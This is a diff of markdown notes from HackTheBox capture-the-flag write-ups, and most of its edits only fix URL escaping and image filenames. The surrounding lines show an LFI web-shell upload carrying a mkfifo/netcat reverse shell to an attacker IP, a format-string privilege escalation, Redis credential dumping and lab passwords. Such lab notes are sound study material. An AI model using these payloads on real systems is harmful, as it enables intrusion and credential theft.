@@ -10,14 +10,14 @@
 
 1. nmap 10.10.11.210 -sVC
 2. dir busting
-   * there is a subdomain ![](https://hackmd.io/\_uploads/rytoaqich.png)
+   * there is a subdomain ![](https://hackmd.io/_uploads/rytoaqich.png)
    * add it also to the /etc/hosts
 
 ### Weaponisation
 
 1. beta subdomain
-   * allows us to download source code ![](https://hackmd.io/\_uploads/BklH0qoqh.png)
-     * When analyzing it we realize that in the / download path if in the parameter image start with 2 points then launch a message that says Hacking detected and makes us a redirect to / list. ![](https://hackmd.io/\_uploads/HkT9C5iq3.png)
+   * allows us to download source code ![](https://hackmd.io/_uploads/BklH0qoqh.png)
+     * When analyzing it we realize that in the / download path if in the parameter image start with 2 points then launch a message that says Hacking detected and makes us a redirect to / list. ![](https://hackmd.io/_uploads/HkT9C5iq3.png)
 
 ### Exploitation
 
@@ -47,7 +47,7 @@
    * we can use ID parameter for LFI
      * create a blog -> edit blog
        * capture req to add the H1/text
-         * we can edit the ID paramater for LFI ![](https://hackmd.io/\_uploads/SkOVqn0q2.png)
+         * we can edit the ID paramater for LFI ![](https://hackmd.io/_uploads/SkOVqn0q2.png)
 
 ### Exploitation
 
@@ -62,7 +62,7 @@
 2. Uploading reverse shell
    * use this to get RS on target machine + change your blog name
 
-> id=/var/www/microblog/\<your\_blog\_name>/uploads/rev.php\&header=<%3fphp+echo+shell\_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.30+443+>/tmp/f")%3b%3f> ![](https://hackmd.io/\_uploads/rJj-j309h.png)
+> id=/var/www/microblog/\<your\_blog\_name>/uploads/rev.php\&header=<%3fphp+echo+shell\_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.30+443+>/tmp/f")%3b%3f> ![](https://hackmd.io/_uploads/rJj-j309h.png)
 
 * after visiting the /uploads/rev.php we will get our RS
 
@@ -71,7 +71,7 @@
 1. Connect to Redis-cli
    * socks config file
      * redis-cli -s /var/run/redis/redis.sock
-     * keys \* ![](https://hackmd.io/\_uploads/SyLwo205h.png)
+     * keys \* ![](https://hackmd.io/_uploads/SyLwo205h.png)
      * hgetall cooper.dooper
        * `cooper:zooperdoopercooper`
 2. SSH connect to obtain user flag
@@ -85,9 +85,9 @@
 2. Vuln
    * register a user using redis-cli and use the vuln in username to print all variables
      * `HSET test2 username test1 password test first-name`
-     * `{license.__init__.__globals__} last-name test pro false` ![](https://hackmd.io/\_uploads/S1LOThRq3.png)
+     * `{license.__init__.__globals__} last-name test pro false` ![](https://hackmd.io/_uploads/S1LOThRq3.png)
    * run /usr/bin/licence as sudo to provision the licence of our "test2" user
-     * `sudo /usr/bin/license -p test2` ![](https://hackmd.io/\_uploads/Hy\_na3Rc2.png)
+     * `sudo /usr/bin/license -p test2` ![](https://hackmd.io/_uploads/Hy_na3Rc2.png)
        * we obtained SSH credentials for root
          * `root:unCR4ckaBL3Pa$$w0rd`
 3. SSH login as a root to obtain root flag
@@ -97,7 +97,7 @@
 ### Reco
 
 * `sudo nmap -sVC <IP>`
-  * ![](https://hackmd.io/\_uploads/SkZBpNRo3.png)
+  * ![](https://hackmd.io/_uploads/SkZBpNRo3.png)
   * 22 SSH
   * 80 HTTP
     * redirect -> add download.htb to /etc/hosts
@@ -111,14 +111,14 @@
 
 ### Weaponisation
 
-1. while trying to upload a file with BurpSuite, I found out tha it is an **Express** based website - upload the file -> we obtain unique UID and link ![](https://hackmd.io/\_uploads/H1ZfZSRo3.png) - click "Copy Link" button -> small popup window followed by an alert - it is a file called copy.js (contains the code for the function, nothing vulnerable) - there is also a JWT token withing the download + a .sig cooke ![](https://hackmd.io/\_uploads/HyJBZrAj3.png) - decoded token: `{"flashes":{"info":[],"error":[],"success":[]}}`
+1. while trying to upload a file with BurpSuite, I found out tha it is an **Express** based website - upload the file -> we obtain unique UID and link ![](https://hackmd.io/_uploads/H1ZfZSRo3.png) - click "Copy Link" button -> small popup window followed by an alert - it is a file called copy.js (contains the code for the function, nothing vulnerable) - there is also a JWT token withing the download + a .sig cooke ![](https://hackmd.io/_uploads/HyJBZrAj3.png) - decoded token: `{"flashes":{"info":[],"error":[],"success":[]}}`
    * Download feature
      * redirects us to the link:
        * `http://download.htb/files/download/0623ba64-6749-48a4-9a08-a58658b74852`
          * this could be used to download other files...
          * uploads are probably stored within a /downloads or /uploads folder on the machine
            * basic LFI with some Express file names...
-             * `..%2fapp.js` worked... ![](https://hackmd.io/\_uploads/HJMYk8Cjn.png)
+             * `..%2fapp.js` worked... ![](https://hackmd.io/_uploads/HJMYk8Cjn.png)
                * there is package.json as part of the folders too: `{ "name": "download.htb", "version": "1.0.0", "description": "", "main": "app.js", "scripts": { "test": "echo \"Error: no test specified\" && exit 1", "dev": "nodemon --exec ts-node --files ./src/app.ts", "build": "tsc" }, "keywords": [], "author": "wesley", "license": "ISC", "dependencies": { "@prisma/client": "^4.13.0", "cookie-parser": "^1.4.6", "cookie-session": "^2.0.0", "express": "^4.18.2", "express-fileupload": "^1.4.0", "zod": "^3.21.4" }, "devDependencies": { "@types/cookie-parser": "^1.4.3", "@types/cookie-session": "^2.0.44", "@types/express": "^4.17.17", "@types/express-fileupload": "^1.4.1", "@types/node": "^18.15.12", "@types/nunjucks": "^3.2.2", "nodemon": "^2.0.22", "nunjucks": "^3.2.4", "prisma": "^4.13.0", "ts-node": "^10.9.1", "typescript": "^5.0.4" } }`
          * AUTHOR: **WESLEY**
 2. enumerating LOGIN
@@ -254,7 +254,7 @@ reserse shell should be obtained in nc -nlvp \<PORT>
 
 #### Website
 
-<figure><img src=".gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption><p>https://10.10.11.241/</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption><p>https://10.10.11.241/</p></figcaption></figure>
 
 <figure><img src=".gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption><p>http://10.10.11.241:8080</p></figcaption></figure>
 
@@ -856,7 +856,7 @@ CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
 
 *   Finding the exploit for VIEWSTATE which is response for downloading button...
 
-    * [https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-\_\_viewstate-parameter?source=post\_page-----7516c938c688--------------------------------](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-\_\_viewstate-parameter?source=post\_page-----7516c938c688--------------------------------)
+    * [https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-\_\_viewstate-parameter?source=post\_page-----7516c938c688--------------------------------](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter?source=post_page-----7516c938c688--------------------------------)
       * **ViewState** is the method that the ASP.NET framework uses by default to p**reserve page and control values between web pages**. When the HTML for the page is rendered, the current state of the page and values that need to be retained during postback are serialized into base64-encoded strings and output in the ViewState hidden field or fields.
     * try changing filename from cv.pdf to some sensitive info...
       * filename -> /web.config
@@ -932,13 +932,13 @@ echo $Credential.GetNetworkCredential().password
 ```
 
 * Download RunasCs.exe, psgetsys.ps1 and EnableAllTokenPrivs.ps1 from here
-  * [https://github.com/Cyberw1ng/OSCP/tree/main/HackTheBox/Pov?source=post\_page-----7516c938c688--------------------------------](https://github.com/Cyberw1ng/OSCP/tree/main/HackTheBox/Pov?source=post\_page-----7516c938c688--------------------------------)
+  * [https://github.com/Cyberw1ng/OSCP/tree/main/HackTheBox/Pov?source=post\_page-----7516c938c688--------------------------------](https://github.com/Cyberw1ng/OSCP/tree/main/HackTheBox/Pov?source=post_page-----7516c938c688--------------------------------)
 * Open Terminal in the Downloaded Folder and type the below command to start http server to transfer files from our machine to Windows.
   * `python3 -m http.server`
   *
 
       <figure><img src=".gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
-  * The link of the file will be like [http://YOUR\_IP:8000/filename](http://your\_ip:8000/filename)
+  * The link of the file will be like [http://YOUR\_IP:8000/filename](http://your_ip:8000/filename)
   * use the command below command to download the files in the victim machine
 
 ```powershell
@@ -1113,7 +1113,7 @@ Impacket & RS
 
 #### website
 
-<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * try default credentials for OpenPLC
   * openplc:openplc
@@ -1162,7 +1162,7 @@ Impacket & RS
 * Compile & Start PLC
   * we obtained revshell, easily
 
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
